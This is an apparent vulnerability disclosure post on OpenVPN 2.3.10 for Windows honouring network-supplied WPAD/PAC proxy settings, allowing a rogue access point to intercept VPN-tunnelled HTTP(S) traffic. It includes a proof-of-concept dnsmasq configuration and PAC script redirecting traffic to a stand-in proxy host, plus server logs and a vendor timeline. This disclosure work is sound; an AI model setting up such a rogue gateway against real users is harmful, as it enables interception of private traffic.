---
layout: post
title: OpenVPN - HTTP(S) Tunnelled Traffic Interception
category: bugreports
---

Windows OpenVPN users connecting to a VPN network from an untrusted/malicious network are at risk of having all VPN tunnelled HTTP(S) traffic intercepted by a 3rd party. OpenVPN on Windows honours the Web Proxy Auto-Discovery (WPAD) settings, configured by the network the client is connecting from, on VPN connections.
<!--more-->

<pre class="bugreport">
Description:        OpenVPN HTTP(S) Tunnelled Traffic Interception
Versions Affected:  OpenVPN 2.3.10 for Windows
Category:           Traffic Interception
Reporter:           Alex Chapman and Paul Stone of Context Information Security

Summary:
--------
Windows OpenVPN users connecting to a VPN network from an untrusted/malicious network are at risk of having all VPN tunnelled HTTP(S) traffic intercepted by a 3rd party. OpenVPN on Windows honours the Web Proxy Auto-Discovery (WPAD) settings, configured by the network the client is connecting from, on VPN connections. WPAD settings configure system-wide HTTP proxies via Proxy Auto-Config (PAC) scripts. This allows a malicious network operator, such as a rogue access point, to proxy all VPN-tunnelled HTTP(S) requests for OpenVPN clients connecting from their network.

Analysis:
---------
The PAC configured proxy can log all traffic, defeating the confidentiality provided by OpenVPN, or modify traffic in transit to affect the integrity of the VPN traffic.

This issue has been confirmed on Windows 10 and Windows 7 with OpenVPN version 2.3.10-I603-x86_64.

WPAD/PAC is enabled by default on all modern desktop versions of Windows. It should be noted that disabling the default "Automatically detect settings" option in the Windows "Local Area Network (LAN) Settings" configuration partially mitigates this issue. However, clients with specifically configured PAC files (using the "Use automatic configuration script" option in the Windows "Local Area Network (LAN) Settings" configuration), may still be at risk.

Proof of Concept:
-----------------
Provided here is a Proof of Concept setup which will act as a network gateway, providing a PAC script via DHCP. The PAC script sets the default system proxy to an HTTP proxy on the internet, in this case a fictitious proxy at proxy.example.com. When a Windows system attaches to this network, WPAD/PAC will configure the system proxy. When the system connects to an OpenVPN end point we can see that the proxy setting are still honoured.

The following dnsmasq configuration can be used to provide a PAC file to Windows hosts via WPAD DHCP:

    interface=eth0
    dhcp-authoritative
    dhcp-range=192.168.100.100,192.168.100.199,10m
    dhcp-option=3,192.168.100.1
    dhcp-option=6,192.168.100.1
    dhcp-option=252,http://proxy.example.com:80/proxy.pac

The dhcp-option=252 option specifies the URL from which Windows hosts will download the PAC script.

The following PAC script can be can be provided to proxy all HTTP(S) traffic through a Web Proxy hosted at proxy.example.com:3128:

  function FindProxyForURL(url, host){
    return "PROXY proxy.example.com:3128";
  }

Windows hosts which connect to a network as configured above will, by default, push all HTTP(S) traffic through the HTTP proxy at proxy.example.com:3128. After an OpenVPN connection is established the WPAD/PAC settings remain in use, forwarding all VPN tunnelled HTTP(S) traffic out of the OpenVPN endpoint through the configured HTTP proxy.

Below are logs which show connections HTTP connections from the above configured network to the WPAD/PAC configured proxy occurring both pre and post VPN connection.

Nginx access logs of Windows and Google Chrome fetching PAC script before connecting to the VPN:

    88.98.79.12 - - [08/Apr/2016:09:33:45 -0400] "GET /proxy.pac HTTP/1.1" 200 215 "-" "WinHttp-Autoproxy-Service/5.1"
    88.98.79.12 - - [08/Apr/2016:09:34:14 -0400] "GET /proxy.pac HTTP/1.1" 200 215 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36"
    88.98.79.12 - - [08/Apr/2016:09:34:15 -0400] "GET /proxy.pac HTTP/1.1" 200 215 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36"

Squid-cache access logs of proxy connections for www.contextis.com before connecting to the VPN:

    1460122463.651    156 88.98.79.12 TCP_MISS/304 475 GET http://www.contextis.com/ - HIER_DIRECT/93.184.216.34 -

Nginx access logs of Windows and Google Chrome fetching PAC script after connecting to the VPN:

    46.28.53.168 - - [08/Apr/2016:09:35:55 -0400] "GET /proxy.pac HTTP/1.1" 200 215 "-" "WinHttp-Autoproxy-Service/5.1"
    46.28.53.168 - - [08/Apr/2016:09:36:00 -0400] "GET /proxy.pac HTTP/1.1" 200 215 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36"
    46.28.53.168 - - [08/Apr/2016:09:36:01 -0400] "GET /proxy.pac HTTP/1.1" 200 215 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36"

Squid-cache access logs of proxy connections for www.contextis.com after connecting to the VPN:

    1460122571.505    151 46.28.53.168 TCP_MISS/304 453 GET http://www.contextis.com/ - HIER_DIRECT/93.184.216.34 -

NOTE: The IP address on the "after" logs have changed to that of the VPN end point.

Timeline
--------
20160414 - Email to security@openvpn.net
20160418 - Initial response and request for more information
20160516 - Issue confirmed
20160902 - Confirmed no fix will be implemented
</pre>
